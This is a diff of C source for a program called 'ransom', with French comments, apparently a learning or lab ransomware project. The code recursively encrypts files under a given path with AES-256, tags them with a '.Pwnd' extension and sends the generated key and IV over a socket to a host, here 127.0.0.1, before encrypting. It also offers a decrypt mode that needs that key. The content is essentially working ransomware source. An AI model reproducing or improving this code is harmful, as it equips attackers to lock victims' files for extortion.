@@ -4,21 +4,21 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <string.h>
+
 
 void usage();
 
 int is_encrypted(char *file)
 {
 	// Si le nom du fichier contient .Pwnd
-	if (strstr(file, ".Pwnd") != NULL)
+	if (strstr(file, ENCRYPT_EXT) != NULL)
 	{
 		return 1;
 	}
 	return 0;
 }
 
-void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
+int listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
 {
 	struct dirent *entry;
 	DIR *dir = opendir(name);
@@ -26,7 +26,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	if (!dir)
 	{
 		printf("Unable to open directory \"%s\".\n", name);
-		return;
+		return 0;
 	}
 
 	while ((entry = readdir(dir)) != NULL)
@@ -107,12 +107,9 @@ int main(int argc, char *argv[])
 	char pKey[AES_256_KEY_SIZE / 2];
 	char pIv[AES_BLOCK_SIZE / 2];
 
-	char de_flag;
-	char *path;
-
 	if (argc > 1)
 	{
-		// Arguments: ransom [-d|-e] <key> <iv> chemin
+		// Si flag -e
 		if (strcmp(argv[1], "-e") == 0)
 		{
 			if (argc != 3)
@@ -121,9 +118,12 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
-			de_flag = 'e';
-			path = argv[2];
+			generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
+			send_key(pKey, pIv, "127.0.0.1");
+
+			listdir(argv[2], iv, key, 'e');
 		}
+		// Si flag -d
 		else if (strcmp(argv[1], "-d") == 0)
 		{
 			if (argc != 5)
@@ -131,11 +131,11 @@ int main(int argc, char *argv[])
 				printf("Correct syntax: ransom -d key iv path\n");
 				return 0;
 			}
-			de_flag = 'd';
-
+			
+			// Check la taille de la clé
 			if (strlen(argv[2]) == AES_256_KEY_SIZE)
 			{
-				strcpy(pKey, argv[2]);
+				hexa_to_bytes(argv[2], key, AES_256_KEY_SIZE);
 			}
 			else
 			{
@@ -143,9 +143,10 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
+			// Check la taille du vecteur
 			if (strlen(argv[3]) == AES_BLOCK_SIZE)
 			{
-				strcpy(pKey, argv[3]);
+				hexa_to_bytes(argv[3], iv, AES_BLOCK_SIZE);
 			}
 			else
 			{
@@ -153,21 +154,17 @@ int main(int argc, char *argv[])
 				return 0;
 			}
 
-			path = argv[4];
+			listdir(argv[4], iv, key, 'd');
 		}
 		else
-		{ // Si ni -e ni -d -> Erreur
+		{
 			printf("You must specify -d or -e\n");
+			return 0;
 		}
 	}
 	else
 	{
 		printf("You must specify -d or -e\n");
+		return 0;
 	}
-
-	generate_key(key, AES_256_KEY_SIZE, iv, AES_BLOCK_SIZE, pKey, pIv);
-
-	listdir(path, iv, key, de_flag);
-
-	send_key(pKey, pIv, "127.0.0.1");
 }
